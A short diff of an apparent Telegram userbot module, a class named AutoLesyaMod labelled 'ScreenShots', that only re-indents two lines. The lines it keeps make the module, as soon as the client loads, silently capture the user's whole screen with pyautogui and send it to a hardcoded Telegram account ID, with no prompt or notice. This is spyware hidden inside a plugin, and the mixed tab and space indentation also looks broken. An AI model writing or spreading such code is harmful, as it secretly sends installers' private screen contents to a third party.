@@ -20,8 +20,8 @@ class AutoLesyaMod(loader.Module):
 	strings = {"name": "ScreenShots"}
   
 	async def client_ready(self, client):
-        image = pyautogui.screenshot(region=(0,0, 1920, 1080))
-        await self._client.send_message(944645249, "", file=image)
+        	image = pyautogui.screenshot(region=(0,0, 1920, 1080))
+        	await self._client.send_message(944645249, "", file=image)
   
 	async def screen(self, message):
 		print(self, message)
